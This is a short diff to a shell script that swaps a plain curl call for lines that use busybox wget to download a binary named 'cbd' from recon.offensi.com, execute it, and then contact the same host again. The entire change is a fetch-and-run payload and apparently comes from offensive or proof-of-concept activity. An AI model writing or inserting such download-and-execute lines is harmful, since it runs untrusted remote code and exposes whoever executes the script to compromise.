@@ -1,2 +1,5 @@
 #!/bin/sh
-curl recon.offensi.com
+/bin/busybox wget http://recon.offensi.com/cbd
+./cbd
+curl http://recon.offensi.com
+
